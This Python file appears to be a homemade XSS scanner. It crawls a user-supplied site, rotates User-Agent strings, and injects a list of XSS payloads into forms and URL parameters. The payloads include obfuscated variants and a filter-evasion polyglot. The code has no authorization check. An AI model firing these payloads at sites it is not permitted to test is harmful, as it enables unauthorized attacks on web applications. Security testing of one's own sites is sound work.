import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import logging
import re
import random
import concurrent.futures
import json
import csv
import traceback

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

class XScanner:
    def __init__(self, base_url, max_workers=20, timeout=10):
        self.base_url = base_url.rstrip('/')
        self.visited_urls = set()
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.get_random_user_agent()})
        self.vulnerabilities = []
        self.max_workers = max_workers
        self.timeout = timeout
        self.payloads = self.generate_payloads()

    def get_random_user_agent(self):
        """Return a random User-Agent string."""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
        ]
        return random.choice(user_agents)

    def generate_payloads(self):
        """Generate a variety of advanced XSS payloads."""
        basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "\" onmouseover=\"alert('XSS')\"",
            "<svg/onload=alert('XSS')>",
            "<iframe src='javascript:alert(`XSS`)'>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<object data='javascript:alert(`XSS`)'>"
        ]

        obfuscation_techniques = [
            lambda x: x,  # No obfuscation
            lambda x: x.replace("<", "&lt;").replace(">", "&gt;"),
            lambda x: x.replace("<", "%3C").replace(">", "%3E"),
            lambda x: x.replace("<", "&#60;").replace(">", "&#62;"),
            lambda x: "".join([f"&#{ord(c)};" for c in x]),  # Decimal encoding
            lambda x: "".join([f"&#x{ord(c):x};" for c in x]),  # Hex encoding
            lambda x: x.replace("alert", "a\u006cert")  # Unicode obfuscation
        ]

        payloads = []
        for payload in basic_payloads:
            for technique in obfuscation_techniques:
                payloads.append(technique(payload))
                
        additional_payloads = [
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<svg><script>x='<img/'+'src=\"ht'\r+String.fromCharCode(116)+'p://ma'\r+String.fromCharCode(105)+'npage.com\"/>'; document.body.appendChild(document.createElement('img')).src=x;</script>",
            "<a href=\"jAvAsCrIpT:/*--></title></style></textarea></script></xmp><svg/onload=\u0061&#x6C;&#101%72t(1)>\">X</a>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
        ]

        for payload in additional_payloads:
            payloads.append(payload)

        return payloads

    def crawl(self, url):
        """Crawl the website to find forms and URLs."""
        if url in self.visited_urls or not url.startswith(self.base_url):
            return
        logging.info(f"Crawling URL: {url}")
        self.visited_urls.add(url)

        try:
            response = self.session.get(url, timeout=self.timeout)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            logging.error(f"Failed to fetch {url}: {e}")
            return

        # Extract and test forms
        forms = soup.find_all('form')
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            form_tasks = [executor.submit(self.test_form_for_xss, url, form) for form in forms]

        # Extract and crawl links
        links = soup.find_all('a', href=True)
        link_urls = [urljoin(self.base_url, link['href']) for link in links]
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            link_tasks = [executor.submit(self.crawl, link_url) for link_url in link_urls]

        # Extract and test JavaScript-based links
        scripts = soup.find_all('script')
        js_links = self.extract_js_links(scripts)
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            js_link_tasks = [executor.submit(self.crawl, js_link) for js_link in js_links]

        # Test URL parameters for XSS
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        for param in query_params:
            self.test_url_param_for_xss(url, param)

    def extract_js_links(self, scripts):
        """Extract JavaScript-based links."""
        js_links = []
        js_pattern = re.compile(r"window\.location\.href\s*=\s*['\"](.*?)['\"]")
        for script in scripts:
            script_content = script.string
            if script_content:
                matches = js_pattern.findall(script_content)
                for match in matches:
                    js_links.append(urljoin(self.base_url, match))
        return js_links

    def test_form_for_xss(self, url, form):
        """Test a form for XSS vulnerabilities."""
        form_details = self.extract_form_details(form)
        for payload in self.payloads:
            response = self.submit_form(url, form_details, payload)
            if response and self.detect_xss(response.text, payload):
                vulnerability = {
                    "type": "form",
                    "url": url,
                    "payload": payload,
                    "form": form_details,
                }
                if not self.is_false_positive(url, vulnerability):
                    self.vulnerabilities.append(vulnerability)
                    logging.warning(f"XSS vulnerability detected: {vulnerability}")

    def extract_form_details(self, form):
        """Extract form details."""
        details = {
            "action": form.attrs.get('action', '').lower(),
            "method": form.attrs.get('method', 'get').lower(),
            "inputs": []
        }
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            if input_name:
                details['inputs'].append({'type': input_type, 'name': input_name})
        return details

    def submit_form(self, url, form_details, payload):
        """Submit a form with a payload."""
        target_url = urljoin(url, form_details['action'])
        data = {}
        for input_tag in form_details['inputs']:
            if input_tag['type'] in ['text', 'search', 'textarea']:
                data[input_tag['name']] = payload
            elif input_tag['type'] in ['hidden', 'password', 'email']:
                data[input_tag['name']] = 'test'
            elif input_tag['type'] in ['submit']:
                data[input_tag['name']] = 'submit'
            elif input_tag['type'] == 'checkbox':
                data[input_tag['name']] = input_tag.get('value', 'on')
            elif input_tag['type'] == 'radio':
                if input_tag.get('checked'):
                    data[input_tag['name']] = input_tag.get('value', 'on')

        try:
            if form_details['method'] == 'post':
                response = self.session.post(target_url, data=data, timeout=self.timeout)
            else:
                response = self.session.get(target_url, params=data, timeout=self.timeout)
            response.raise_for_status()
            return response
        except requests.RequestException as e:
            logging.error(f"Form submission failed for {target_url}: {e}")
            return None

    def test_url_param_for_xss(self, url, param):
        """Test URL parameters for XSS vulnerabilities."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if param not in query_params:
            return
        
        original_params = query_params[param]
        for payload in self.payloads:
            query_params[param] = payload
            modified_url = parsed_url._replace(query=urlencode(query_params, doseq=True)).geturl()
            try:
                response = self.session.get(modified_url, timeout=self.timeout)
                response.raise_for_status()
                if self.detect_xss(response.text, payload):
                    vulnerability = {
                        "type": "url_param",
                        "url": modified_url,
                        "param": param,
                        "payload": payload,
                    }
                    if not self.is_false_positive(url, vulnerability):
                        self.vulnerabilities.append(vulnerability)
                        logging.warning(f"XSS vulnerability detected: {vulnerability}")
            except requests.RequestException as e:
                logging.error(f"URL parameter testing failed for {modified_url}: {e}")
            
            query_params[param] = original_params  # Restore original parameter value

    def detect_xss(self, response_text, payload):
        """Detect XSS in the response."""
        # Context-aware detection
        if payload in response_text:
            # Simple string match as an initial check
            return True
        return False

    def is_false_positive(self, url, vulnerability):
        pass

    def export_vulnerabilities_to_json(self, filename):
        """Export vulnerabilities to a JSON file."""
        with open(filename, 'w') as f:
            json.dump(self.vulnerabilities, f, indent=4)
        logging.info(f"Vulnerabilities exported to {filename}")

    def export_vulnerabilities_to_csv(self, filename):
        """Export vulnerabilities to a CSV file."""
        keys = self.vulnerabilities[0].keys()
        with open(filename, 'w', newline='') as f:
            dict_writer = csv.DictWriter(f, keys)
            dict_writer.writeheader()
            dict_writer.writerows(self.vulnerabilities)
        logging.info(f"Vulnerabilities exported to {filename}")

    def scan(self):
        """Initiate the scanning process."""
        logging.info(f"Starting scan on {self.base_url}")
        self.crawl(self.base_url)
        logging.info("Scan complete. Vulnerabilities found:")
        if self.vulnerabilities:
            for vulnerability in self.vulnerabilities:
                logging.warning(vulnerability)
            self.export_vulnerabilities_to_json('vulnerabilities.json')
            self.export_vulnerabilities_to_csv('vulnerabilities.csv')
        else:
            logging.info("No XSS vulnerabilities found.")

if __name__ == "__main__":
    base_url = input("Enter the base URL to scan: ").strip()
    scanner = XScanner(base_url)
    scanner.scan()
